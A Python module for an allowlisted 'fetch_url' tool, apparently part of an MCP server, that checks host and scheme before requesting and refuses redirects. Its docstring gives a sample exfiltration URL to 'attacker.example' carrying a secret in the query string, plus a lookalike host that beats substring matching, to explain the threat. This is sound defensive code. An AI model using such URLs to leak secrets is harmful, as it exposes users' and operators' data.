"""`fetch_url`: the tool that is two threats at once.

It pulls text the company did not write (untrusted input) and it makes a
request to somewhere else (an external channel). A URL is a data exfiltration
primitive -- `https://attacker.example/?d=<the secret>` needs no response body
to work -- so the interesting control is the allowlist, and it is applied to
the host *before* the request is made, not to the response after.

The allowlist is exact-host or a leading-dot suffix. No regex, no substring:
`evil-status.example.com.attacker.tld` matches a substring rule for
"status.example.com" and is not the same host.
"""

from __future__ import annotations

import os
from collections.abc import Callable
from urllib.parse import urlsplit

DEFAULT_ALLOWLIST = ("status.example.com", "docs.example.com")
MAX_BYTES = 20_000


class FetchRefused(RuntimeError):
    """The request was refused before anything left the process."""


def allowlist_from_env() -> tuple[str, ...]:
    raw = os.environ.get("AIMAI_MCP_FETCH_ALLOWLIST")
    if not raw:
        return DEFAULT_ALLOWLIST
    return tuple(h.strip().lower() for h in raw.split(",") if h.strip())


def host_allowed(host: str, allowlist: tuple[str, ...]) -> bool:
    host = host.lower().rstrip(".")
    for entry in allowlist:
        if entry.startswith("."):
            if host.endswith(entry) and host != entry.lstrip("."):
                return True
            if host == entry.lstrip("."):
                return True
        elif host == entry:
            return True
    return False


def check_url(url: str, allowlist: tuple[str, ...]) -> str:
    """Validate scheme, host and allowlist. Returns the host."""
    parts = urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise FetchRefused(
            f"scheme {parts.scheme or '(none)'} is not allowed; use https"
        )
    host = parts.hostname
    if not host:
        raise FetchRefused("url has no host")
    if not host_allowed(host, allowlist):
        raise FetchRefused(
            f"host {host} is not on the fetch allowlist "
            f"({', '.join(allowlist)}); this is a refusal, not a failure"
        )
    return host


def http_get(url: str, timeout: float = 5.0) -> str:
    import httpx

    with httpx.Client(timeout=timeout, follow_redirects=False) as client:
        response = client.get(url)
        response.raise_for_status()
        return response.text


def fetch(
    url: str,
    *,
    allowlist: tuple[str, ...] | None = None,
    getter: Callable[[str], str] = http_get,
) -> dict[str, object]:
    """Fetch an allowlisted URL and return capped text.

    Redirects are not followed. A 302 to a host that is not on the allowlist
    would otherwise turn the check above into decoration.
    """
    allowlist = allowlist if allowlist is not None else allowlist_from_env()
    host = check_url(url, allowlist)
    body = getter(url)
    truncated = len(body) > MAX_BYTES
    return {
        "host": host,
        "text": body[:MAX_BYTES],
        "truncated": truncated,
        "returns_untrusted_text": True,
    }
